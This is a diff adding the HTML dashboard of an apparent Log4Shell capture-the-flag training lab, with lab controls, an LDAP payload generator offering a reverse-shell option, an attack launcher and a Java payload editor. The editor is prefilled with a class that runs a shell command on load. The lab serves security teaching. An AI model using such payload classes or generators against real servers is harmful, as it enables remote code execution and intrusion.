@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Log4Shell CTF Lab</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap');
+        
+        :root {
+            --bg-primary: #0B0F14;
+            --bg-secondary: #0F1A2B;
+            --bg-card: #121923;
+            --accent-primary: #D41414;
+            --accent-primary-hover: #FF2A2A;
+            --accent-secondary: #1F6AFF;
+            --glow-color: #00C2FF;
+            --accent-danger: #ff3366;
+            --accent-warning: #ffaa00;
+            --text-primary: #F2F4F8;
+            --text-secondary: #8A8F98;
+            --border-color: #223247;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: var(--bg-secondary);
+            border-bottom: 2px solid var(--border-color);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo h1 {
+            font-size: 1.5em;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .score-badge {
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-primary-hover));
+            color: var(--text-primary);
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 1.1em;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .nav-link {
+            padding: 8px 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        
+        .nav-link:hover {
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 30px auto;
+            padding: 0 30px;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(12, 1fr);
+            gap: 25px;
+            margin-bottom: 25px;
+        }
+        
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+        }
+        
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .card-icon {
+            font-size: 1.5em;
+            color: var(--accent-primary);
+        }
+        
+        .card-title {
+            font-size: 1.3em;
+            font-weight: 600;
+        }
+        
+        .col-4 { grid-column: span 4; }
+        .col-12 { grid-column: span 12; }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            text-transform: uppercase;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-primary-hover));
+            color: var(--text-primary);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, var(--accent-danger), #cc0044);
+            color: white;
+        }
+        
+        .btn-secondary {
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
+        
+        .btn-warning {
+            background: linear-gradient(135deg, var(--accent-warning), #ff8800);
+            color: var(--bg-primary);
+        }
+        
+        .btn-block {
+            width: 100%;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+            font-size: 0.9em;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 1em;
+            font-family: 'Fira Code', monospace;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+        }
+        
+        textarea.form-control {
+            min-height: 200px;
+            resize: vertical;
+        }
+        
+        .status-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 15px;
+            background: var(--bg-secondary);
+            border-radius: 8px;
+            border-left: 3px solid var(--accent-primary);
+        }
+        
+        .status-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            animation: blink 2s infinite;
+        }
+        
+        .status-dot.online {
+            background: var(--glow-color);
+            box-shadow: 0 0 10px var(--glow-color);
+        }
+        
+        .status-dot.offline {
+            background: var(--accent-danger);
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .badge {
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 0.85em;
+            font-weight: 600;
+            font-family: 'Fira Code', monospace;
+        }
+        
+        .badge-success {
+            background: rgba(212, 20, 20, 0.16);
+            color: var(--accent-primary);
+            border: 1px solid var(--accent-primary);
+        }
+        
+        .badge-danger {
+            background: rgba(255, 51, 102, 0.2);
+            color: var(--accent-danger);
+            border: 1px solid var(--accent-danger);
+        }
+        
+        .terminal {
+            background: #000;
+            border-radius: 8px;
+            padding: 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .terminal-line {
+            margin-bottom: 8px;
+            padding: 8px;
+            border-left: 2px solid var(--accent-primary);
+            background: rgba(0, 194, 255, 0.06);
+            border-radius: 4px;
+        }
+        
+        .terminal-time {
+            color: var(--accent-secondary);
+            font-weight: 700;
+        }
+        
+        .terminal-text {
+            color: var(--accent-primary);
+        }
+        
+        .payload-display {
+            background: var(--bg-secondary);
+            border: 1px solid var(--accent-primary);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Fira Code', monospace;
+            word-break: break-all;
+        }
+        
+        .alert {
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .alert-success {
+            background: rgba(212, 20, 20, 0.12);
+            border-left: 4px solid var(--accent-primary);
+            color: var(--accent-primary);
+        }
+        
+        .alert-error {
+            background: rgba(255, 51, 102, 0.1);
+            border-left: 4px solid var(--accent-danger);
+            color: var(--accent-danger);
+        }
+        
+        @media (max-width: 1200px) {
+            .col-4 { grid-column: span 12; }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <div style="font-size: 2em;">🔥</div>
+            <h1>Log4Shell CTF Lab</h1>
+        </div>
+        <div class="user-info">
+            <div class="score-badge">
+                <i class="fas fa-trophy"></i> Score: <span id="user-score">0</span>
+            </div>
+            <div class="nav-links">
+                <a href="/quiz" class="nav-link"><i class="fas fa-brain"></i> Quiz</a>
+                <a href="/learn" class="nav-link"><i class="fas fa-book"></i> Learn</a>
+                <a href="/logout" class="nav-link"><i class="fas fa-sign-out-alt"></i> Logout</a>
+            </div>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="grid">
+            <div class="card col-4">
+                <div class="card-header">
+                    <i class="fas fa-server card-icon"></i>
+                    <h2 class="card-title">Infrastructure</h2>
+                </div>
+                <div class="status-list" id="container-status"></div>
+                <button class="btn btn-primary btn-block" onclick="startContainers()">
+                    <i class="fas fa-play"></i> Start Lab
+                </button>
+                <button class="btn btn-danger btn-block" onclick="stopContainers()">
+                    <i class="fas fa-stop"></i> Stop Lab
+                </button>
+                <button class="btn btn-secondary btn-block" onclick="checkStatus()">
+                    <i class="fas fa-sync"></i> Refresh
+                </button>
+            </div>
+            
+            <div class="card col-4">
+                <div class="card-header">
+                    <i class="fas fa-bolt card-icon"></i>
+                    <h2 class="card-title">Payload Generator</h2>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">LDAP Host</label>
+                    <input type="text" class="form-control" id="attacker-ip" value="{{ runtime.ldap_host }}">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">LDAP Port</label>
+                    <input type="number" class="form-control" id="port" value="{{ runtime.ldap_port }}">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Type</label>
+                    <select class="form-control" id="payload-type">
+                        <option value="simple">Simple Test</option>
+                        <option value="reverse_shell">Reverse Shell</option>
+                    </select>
+                </div>
+                <button class="btn btn-primary btn-block" onclick="generatePayload()">
+                    <i class="fas fa-code"></i> Generate
+                </button>
+                <div id="generated-payload"></div>
+            </div>
+            
+            <div class="card col-4">
+                <div class="card-header">
+                    <i class="fas fa-rocket card-icon"></i>
+                    <h2 class="card-title">Attack Control</h2>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Target</label>
+                    <input type="text" class="form-control" id="target" value="{{ runtime.target }}">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Payload</label>
+                    <input type="text" class="form-control" id="attack-payload" value="{{ runtime.payload }}">
+                </div>
+                <button class="btn btn-warning btn-block" onclick="startWebServer()">
+                    <i class="fas fa-globe"></i> Start Web Server
+                </button>
+                <button class="btn btn-danger btn-block" onclick="launchAttack()">
+                    <i class="fas fa-crosshairs"></i> Launch Attack
+                </button>
+                <div id="attack-result"></div>
+            </div>
+        </div>
+        
+        <div class="grid">
+            <div class="card col-12">
+                <div class="card-header">
+                    <i class="fas fa-code card-icon"></i>
+                    <h2 class="card-title">Custom Payload Editor</h2>
+                </div>
+                <textarea class="form-control" id="java-code">public class Rev {
+    public Rev() {}
+    static {
+        try {
+            String[] cmds = {"/bin/sh", "-c", "touch /tmp/pwned"};
+            Runtime.getRuntime().exec(cmds);
+        } catch (Exception e) {}
+    }
+}</textarea>
+                <button class="btn btn-primary" onclick="compilePayload()">
+                    <i class="fas fa-hammer"></i> Compile
+                </button>
+                <div id="compile-result"></div>
+            </div>
+        </div>
+        
+        <div class="grid">
+            <div class="card col-12">
+                <div class="card-header">
+                    <i class="fas fa-terminal card-icon"></i>
+                    <h2 class="card-title">Attack Log</h2>
+                </div>
+                <button class="btn btn-secondary" onclick="refreshLog()">
+                    <i class="fas fa-sync"></i> Refresh
+                </button>
+                <div class="terminal" id="attack-log">
+                    <div class="terminal-line">
+                        <span class="terminal-time">[00:00:00]</span>
+                        <span class="terminal-text"> Waiting for attacks...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        window.onload = function() {
+            checkStatus();
+            updateScore();
+            setInterval(refreshLog, 5000);
+            setInterval(updateScore, 3000);
+        };
+        
+        function updateScore() {
+            fetch('/api/user/score')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        document.getElementById('user-score').textContent = data.score || 0;
+                    }
+                })
+                .catch(error => {
+                    console.error('Fetch error:', error);
+                    document.getElementById('user-score').textContent = '0';
+                });
+        }
+        
+        function checkStatus() {
+            fetch('/api/status')
+                .then(r => r.json())
+                .then(data => {
+                    const container = document.getElementById('container-status');
+                    if (data.status === 'success' && data.containers.length > 0) {
+                        container.innerHTML = data.containers.map(c => `
+                            <div class="status-item">
+                                <div class="status-info">
+                                    <div class="status-dot ${c.status.includes('Up') ? 'online' : 'offline'}"></div>
+                                    <span>${c.name}</span>
+                                </div>
+                                <span class="badge ${c.status.includes('Up') ? 'badge-success' : 'badge-danger'}">
+                                    ${c.status.includes('Up') ? 'ONLINE' : 'OFFLINE'}
+                                </span>
+                            </div>
+                        `).join('');
+                    }
+                });
+        }
+        
+        function startContainers() {
+            fetch('/api/start-containers', {method: 'POST'})
+                .then(r => r.json())
+                .then(data => {
+                    alert(data.message);
+                    setTimeout(checkStatus, 3000);
+                    updateScore();
+                });
+        }
+        
+        function stopContainers() {
+            fetch('/api/stop-containers', {method: 'POST'})
+                .then(r => r.json())
+                .then(data => {
+                    alert(data.message);
+                    checkStatus();
+                });
+        }
+        
+        function generatePayload() {
+            const ip = document.getElementById('attacker-ip').value;
+            const port = document.getElementById('port').value;
+            const type = document.getElementById('payload-type').value;
+            
+            fetch('/api/generate-payload', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ip, port, type})
+            })
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('generated-payload').innerHTML = `
+                    <div class="payload-display">${data.payload}</div>
+                `;
+                document.getElementById('attack-payload').value = data.payload;
+            });
+        }
+        
+        function startWebServer() {
+            fetch('/api/start-webserver', {method: 'POST'})
+                .then(r => r.json())
+                .then(data => alert(data.message));
+        }
+        
+        function launchAttack() {
+            const target = document.getElementById('target').value;
+            const payload = document.getElementById('attack-payload').value;
+            
+            fetch('/api/launch-attack', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({target, payload})
+            })
+            .then(r => r.json())
+            .then(data => {
+                const result = document.getElementById('attack-result');
+                if (data.status === 'success') {
+                    result.innerHTML = `<div class="alert alert-success">${data.message}</div>`;
+                    updateScore();
+                } else {
+                    result.innerHTML = `<div class="alert alert-error">${data.message}</div>`;
+                }
+                refreshLog();
+            });
+        }
+        
+        function compilePayload() {
+            const code = document.getElementById('java-code').value;
+            
+            fetch('/api/compile-payload', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({code})
+            })
+            .then(r => r.json())
+            .then(data => {
+                const result = document.getElementById('compile-result');
+                if (data.status === 'success') {
+                    result.innerHTML = `<div class="alert alert-success">${data.message}</div>`;
+                    updateScore();
+                } else {
+                    result.innerHTML = `<div class="alert alert-error">${data.message}</div>`;
+                }
+            });
+        }
+        
+        function refreshLog() {
+            fetch('/api/attack-log')
+                .then(r => r.json())
+                .then(data => {
+                    const log = document.getElementById('attack-log');
+                    if (data.log && data.log.length > 0) {
+                        log.innerHTML = data.log.slice().reverse().map(entry => `
+                            <div class="terminal-line">
+                                <span class="terminal-time">[${entry.time}]</span>
+                                <span class="terminal-text"> ${entry.user} → ${entry.target}</span>
+                            </div>
+                        `).join('');
+                    }
+                });
+        }
+    </script>
+</body>
+</html>
